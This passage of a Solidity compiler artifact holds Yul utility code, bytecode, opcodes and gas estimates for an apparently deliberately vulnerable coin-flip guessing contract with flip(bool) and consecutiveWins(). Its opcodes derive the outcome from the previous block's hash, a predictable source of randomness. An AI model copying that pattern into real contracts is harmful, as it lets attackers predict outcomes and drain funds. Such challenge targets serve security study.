														"src": "1628:9:3",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1640:6:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "1651:4:3",
														"type": ""
													}
												],
												"src": "1558:222:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1814:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1831:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1834:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1824:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1824:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1824:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1928:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1931:4:3",
																		"type": "",
																		"value": "0x11"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "1921:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1921:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1921:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1952:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "1955:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "1945:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "1945:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1945:15:3"
														}
													]
												},
												"name": "panic_error_0x11",
												"nodeType": "YulFunctionDefinition",
												"src": "1786:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2015:190:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2025:33:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2052:5:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2034:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2034:24:3"
															},
															"variableNames": [
																{
																	"name": "value",
																	"nodeType": "YulIdentifier",
																	"src": "2025:5:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2148:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2150:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2150:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2150:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2073:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2080:66:3",
																		"type": "",
																		"value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
																	}
																],
																"functionName": {
																	"name": "eq",
																	"nodeType": "YulIdentifier",
																	"src": "2070:2:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2070:77:3"
															},
															"nodeType": "YulIf",
															"src": "2067:103:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2179:20:3",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "2190:5:3"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2197:1:3",
																		"type": "",
																		"value": "1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "2186:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2186:13:3"
															},
															"variableNames": [
																{
																	"name": "ret",
																	"nodeType": "YulIdentifier",
																	"src": "2179:3:3"
																}
															]
														}
													]
												},
												"name": "increment_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "2001:5:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "ret",
														"nodeType": "YulTypedName",
														"src": "2011:3:3",
														"type": ""
													}
												],
												"src": "1972:233:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2256:146:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2266:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2289:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2271:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2271:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2266:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2300:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2323:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2305:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2305:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2300:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2347:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x11",
																				"nodeType": "YulIdentifier",
																				"src": "2349:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2349:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2349:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2341:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2344:1:3"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "2338:2:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2338:8:3"
															},
															"nodeType": "YulIf",
															"src": "2335:34:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2379:17:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2391:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2394:1:3"
																	}
																],
																"functionName": {
																	"name": "sub",
																	"nodeType": "YulIdentifier",
																	"src": "2387:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2387:9:3"
															},
															"variableNames": [
																{
																	"name": "diff",
																	"nodeType": "YulIdentifier",
																	"src": "2379:4:3"
																}
															]
														}
													]
												},
												"name": "checked_sub_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2242:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2245:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "diff",
														"nodeType": "YulTypedName",
														"src": "2251:4:3",
														"type": ""
													}
												],
												"src": "2211:191:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2436:152:3",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2453:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2456:77:3",
																		"type": "",
																		"value": "35408467139433450592217433187231851964531694900788300625387963629091585785856"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2446:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2446:88:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2446:88:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2550:1:3",
																		"type": "",
																		"value": "4"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2553:4:3",
																		"type": "",
																		"value": "0x12"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "2543:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2543:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2543:15:3"
														},
														{
															"expression": {
																"arguments": [
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2574:1:3",
																		"type": "",
																		"value": "0"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "2577:4:3",
																		"type": "",
																		"value": "0x24"
																	}
																],
																"functionName": {
																	"name": "revert",
																	"nodeType": "YulIdentifier",
																	"src": "2567:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2567:15:3"
															},
															"nodeType": "YulExpressionStatement",
															"src": "2567:15:3"
														}
													]
												},
												"name": "panic_error_0x12",
												"nodeType": "YulFunctionDefinition",
												"src": "2408:180:3"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "2636:143:3",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "2646:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2669:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2651:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2651:20:3"
															},
															"variableNames": [
																{
																	"name": "x",
																	"nodeType": "YulIdentifier",
																	"src": "2646:1:3"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "2680:25:3",
															"value": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2703:1:3"
																	}
																],
																"functionName": {
																	"name": "cleanup_t_uint256",
																	"nodeType": "YulIdentifier",
																	"src": "2685:17:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2685:20:3"
															},
															"variableNames": [
																{
																	"name": "y",
																	"nodeType": "YulIdentifier",
																	"src": "2680:1:3"
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "2727:22:3",
																"statements": [
																	{
																		"expression": {
																			"arguments": [],
																			"functionName": {
																				"name": "panic_error_0x12",
																				"nodeType": "YulIdentifier",
																				"src": "2729:16:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "2729:18:3"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "2729:18:3"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2724:1:3"
																	}
																],
																"functionName": {
																	"name": "iszero",
																	"nodeType": "YulIdentifier",
																	"src": "2717:6:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2717:9:3"
															},
															"nodeType": "YulIf",
															"src": "2714:35:3"
														},
														{
															"nodeType": "YulAssignment",
															"src": "2759:14:3",
															"value": {
																"arguments": [
																	{
																		"name": "x",
																		"nodeType": "YulIdentifier",
																		"src": "2768:1:3"
																	},
																	{
																		"name": "y",
																		"nodeType": "YulIdentifier",
																		"src": "2771:1:3"
																	}
																],
																"functionName": {
																	"name": "div",
																	"nodeType": "YulIdentifier",
																	"src": "2764:3:3"
																},
																"nodeType": "YulFunctionCall",
																"src": "2764:9:3"
															},
															"variableNames": [
																{
																	"name": "r",
																	"nodeType": "YulIdentifier",
																	"src": "2759:1:3"
																}
															]
														}
													]
												},
												"name": "checked_div_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "x",
														"nodeType": "YulTypedName",
														"src": "2625:1:3",
														"type": ""
													},
													{
														"name": "y",
														"nodeType": "YulTypedName",
														"src": "2628:1:3",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "r",
														"nodeType": "YulTypedName",
														"src": "2634:1:3",
														"type": ""
													}
												],
												"src": "2594:185:3"
											}
										]
									},
									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_bool(value) -> cleaned {\n        cleaned := iszero(iszero(value))\n    }\n\n    function validator_revert_t_bool(value) {\n        if iszero(eq(value, cleanup_t_bool(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_bool(offset, end) -> value {\n        value := calldataload(offset)\n        validator_revert_t_bool(value)\n    }\n\n    function abi_decode_tuple_t_bool(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_bool(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n    function abi_encode_t_bool_to_t_bool_fromStack(value, pos) {\n        mstore(pos, cleanup_t_bool(value))\n    }\n\n    function abi_encode_tuple_t_bool__to_t_bool__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_bool_to_t_bool_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function panic_error_0x11() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x11)\n        revert(0, 0x24)\n    }\n\n    function increment_t_uint256(value) -> ret {\n        value := cleanup_t_uint256(value)\n        if eq(value, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff) { panic_error_0x11() }\n        ret := add(value, 1)\n    }\n\n    function checked_sub_t_uint256(x, y) -> diff {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n\n        if lt(x, y) { panic_error_0x11() }\n\n        diff := sub(x, y)\n    }\n\n    function panic_error_0x12() {\n        mstore(0, 35408467139433450592217433187231851964531694900788300625387963629091585785856)\n        mstore(4, 0x12)\n        revert(0, 0x24)\n    }\n\n    function checked_div_t_uint256(x, y) -> r {\n        x := cleanup_t_uint256(x)\n        y := cleanup_t_uint256(y)\n        if iszero(y) { panic_error_0x12() }\n\n        r := div(x, y)\n    }\n\n}\n",
									"id": 3,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
							"object": "608060405234801561001057600080fd5b50600436106100365760003560e01c80631d263f671461003b578063e6f334d71461006b575b600080fd5b6100556004803603810190610050919061019b565b610089565b60405161006291906101d7565b60405180910390f35b61007361012c565b604051610080919061020b565b60405180910390f35b6000806100a060014361013290919063ffffffff16565b4060001c905080600154036100b457600080fd5b8060018190555060006100d26002548361014890919063ffffffff16565b90506000600182146100e55760006100e8565b60015b9050841515811515036101185760008081548092919061010790610255565b919050555060019350505050610127565b60008081905550600093505050505b919050565b60005481565b60008183610140919061029d565b905092915050565b600081836101569190610300565b905092915050565b600080fd5b60008115159050919050565b61017881610163565b811461018357600080fd5b50565b6000813590506101958161016f565b92915050565b6000602082840312156101b1576101b061015e565b5b60006101bf84828501610186565b91505092915050565b6101d181610163565b82525050565b60006020820190506101ec60008301846101c8565b92915050565b6000819050919050565b610205816101f2565b82525050565b600060208201905061022060008301846101fc565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b6000610260826101f2565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff820361029257610291610226565b5b600182019050919050565b60006102a8826101f2565b91506102b3836101f2565b9250828210156102c6576102c5610226565b5b828203905092915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601260045260246000fd5b600061030b826101f2565b9150610316836101f2565b925082610326576103256102d1565b5b82820490509291505056fea26469706673582212209a326eb189ffeb285007855b6c35f7f357dd3c031edb8b30ed9346544a75f3f064736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x36 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x1D263F67 EQ PUSH2 0x3B JUMPI DUP1 PUSH4 0xE6F334D7 EQ PUSH2 0x6B JUMPI JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x55 PUSH1 0x4 DUP1 CALLDATASIZE SUB DUP2 ADD SWAP1 PUSH2 0x50 SWAP2 SWAP1 PUSH2 0x19B JUMP JUMPDEST PUSH2 0x89 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x62 SWAP2 SWAP1 PUSH2 0x1D7 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x73 PUSH2 0x12C JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x80 SWAP2 SWAP1 PUSH2 0x20B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 DUP1 PUSH2 0xA0 PUSH1 0x1 NUMBER PUSH2 0x132 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST BLOCKHASH PUSH1 0x0 SHR SWAP1 POP DUP1 PUSH1 0x1 SLOAD SUB PUSH2 0xB4 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP1 PUSH1 0x1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 PUSH2 0xD2 PUSH1 0x2 SLOAD DUP4 PUSH2 0x148 SWAP1 SWAP2 SWAP1 PUSH4 0xFFFFFFFF AND JUMP JUMPDEST SWAP1 POP PUSH1 0x0 PUSH1 0x1 DUP3 EQ PUSH2 0xE5 JUMPI PUSH1 0x0 PUSH2 0xE8 JUMP JUMPDEST PUSH1 0x1 JUMPDEST SWAP1 POP DUP5 ISZERO ISZERO DUP2 ISZERO ISZERO SUB PUSH2 0x118 JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x107 SWAP1 PUSH2 0x255 JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH1 0x1 SWAP4 POP POP POP POP PUSH2 0x127 JUMP JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH1 0x0 SWAP4 POP POP POP POP JUMPDEST SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x140 SWAP2 SWAP1 PUSH2 0x29D JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 DUP4 PUSH2 0x156 SWAP2 SWAP1 PUSH2 0x300 JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x178 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP2 EQ PUSH2 0x183 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 CALLDATALOAD SWAP1 POP PUSH2 0x195 DUP2 PUSH2 0x16F JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x1B1 JUMPI PUSH2 0x1B0 PUSH2 0x15E JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x1BF DUP5 DUP3 DUP6 ADD PUSH2 0x186 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x1D1 DUP2 PUSH2 0x163 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x1EC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1C8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x205 DUP2 PUSH2 0x1F2 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x220 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x1FC JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x260 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x292 JUMPI PUSH2 0x291 PUSH2 0x226 JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2A8 DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x2B3 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 DUP3 LT ISZERO PUSH2 0x2C6 JUMPI PUSH2 0x2C5 PUSH2 0x226 JUMP JUMPDEST JUMPDEST DUP3 DUP3 SUB SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x12 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x30B DUP3 PUSH2 0x1F2 JUMP JUMPDEST SWAP2 POP PUSH2 0x316 DUP4 PUSH2 0x1F2 JUMP JUMPDEST SWAP3 POP DUP3 PUSH2 0x326 JUMPI PUSH2 0x325 PUSH2 0x2D1 JUMP JUMPDEST JUMPDEST DUP3 DUP3 DIV SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 SWAP11 ORIGIN PUSH15 0xB189FFEB285007855B6C35F7F357DD EXTCODECOPY SUB 0x1E 0xDB DUP12 ADDRESS 0xED SWAP4 CHAINID SLOAD 0x4A PUSH22 0xF3F064736F6C634300080F0033000000000000000000 ",
							"sourceMap": "174:728:0:-:0;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;446:453;;;;;;;;;;;;;:::i;:::-;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;230:30;;;:::i;:::-;;;;;;;:::i;:::-;;;;;;;;446:453;489:4;502:18;541:19;558:1;541:12;:16;;:19;;;;:::i;:::-;531:30;523:39;;502:60;;587:10;575:8;;:22;571:53;;608:8;;;571:53;643:10;632:8;:21;;;;660:16;679:22;694:6;;679:10;:14;;:22;;;;:::i;:::-;660:41;;708:9;732:1;720:8;:13;:28;;743:5;720:28;;;736:4;720:28;708:40;;769:6;761:14;;:4;:14;;;757:137;;786:15;;:17;;;;;;;;;:::i;:::-;;;;;;819:4;812:11;;;;;;;757:137;864:1;846:15;:19;;;;881:5;874:12;;;;;446:453;;;;:::o;230:30::-;;;;:::o;3122:96:2:-;3180:7;3210:1;3206;:5;;;;:::i;:::-;3199:12;;3122:96;;;;:::o;3850:::-;3908:7;3938:1;3934;:5;;;;:::i;:::-;3927:12;;3850:96;;;;:::o;88:117:3:-;197:1;194;187:12;334:90;368:7;411:5;404:13;397:21;386:32;;334:90;;;:::o;430:116::-;500:21;515:5;500:21;:::i;:::-;493:5;490:32;480:60;;536:1;533;526:12;480:60;430:116;:::o;552:133::-;595:5;633:6;620:20;611:29;;649:30;673:5;649:30;:::i;:::-;552:133;;;;:::o;691:323::-;747:6;796:2;784:9;775:7;771:23;767:32;764:119;;;802:79;;:::i;:::-;764:119;922:1;947:50;989:7;980:6;969:9;965:22;947:50;:::i;:::-;937:60;;893:114;691:323;;;;:::o;1020:109::-;1101:21;1116:5;1101:21;:::i;:::-;1096:3;1089:34;1020:109;;:::o;1135:210::-;1222:4;1260:2;1249:9;1245:18;1237:26;;1273:65;1335:1;1324:9;1320:17;1311:6;1273:65;:::i;:::-;1135:210;;;;:::o;1351:77::-;1388:7;1417:5;1406:16;;1351:77;;;:::o;1434:118::-;1521:24;1539:5;1521:24;:::i;:::-;1516:3;1509:37;1434:118;;:::o;1558:222::-;1651:4;1689:2;1678:9;1674:18;1666:26;;1702:71;1770:1;1759:9;1755:17;1746:6;1702:71;:::i;:::-;1558:222;;;;:::o;1786:180::-;1834:77;1831:1;1824:88;1931:4;1928:1;1921:15;1955:4;1952:1;1945:15;1972:233;2011:3;2034:24;2052:5;2034:24;:::i;:::-;2025:33;;2080:66;2073:5;2070:77;2067:103;;2150:18;;:::i;:::-;2067:103;2197:1;2190:5;2186:13;2179:20;;1972:233;;;:::o;2211:191::-;2251:4;2271:20;2289:1;2271:20;:::i;:::-;2266:25;;2305:20;2323:1;2305:20;:::i;:::-;2300:25;;2344:1;2341;2338:8;2335:34;;;2349:18;;:::i;:::-;2335:34;2394:1;2391;2387:9;2379:17;;2211:191;;;;:::o;2408:180::-;2456:77;2453:1;2446:88;2553:4;2550:1;2543:15;2577:4;2574:1;2567:15;2594:185;2634:1;2651:20;2669:1;2651:20;:::i;:::-;2646:25;;2685:20;2703:1;2685:20;:::i;:::-;2680:25;;2724:1;2714:35;;2729:18;;:::i;:::-;2714:35;2771:1;2768;2764:9;2759:14;;2594:185;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "174200",
								"executionCost": "27340",
								"totalCost": "201540"
							},
							"external": {
								"consecutiveWins()": "2429",
								"flip(bool)": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 174,
									"end": 902,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 174,
									"end": 902,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 174,
									"end": 902,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 303,
									"end": 380,
									"name": "PUSH",
									"source": 0,
									"value": "8000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 286,
									"end": 380,
									"name": "PUSH",
									"source": 0,
									"value": "2"
								},
								{
									"begin": 286,
									"end": 380,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 387,
									"end": 440,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 387,
									"end": 440,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "REVERT",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "tag",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 387,
									"end": 440,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 387,
									"end": 440,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 433,
									"end": 434,
									"name": "PUSH",
									"source": 0,
									"value": "0"
								},
								{
									"begin": 415,
									"end": 430,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 415,
									"end": 434,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 415,
									"end": 434,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 415,
									"end": 434,
									"name": "SSTORE",
									"source": 0
								},
								{
									"begin": 415,
									"end": 434,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 174,
									"end": 902,
									"name": "PUSH #[$]",
									"source": 0,
									"value": "0000000000000000000000000000000000000000000000000000000000000000"
								},
								{
									"begin": 174,
									"end": 902,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 174,
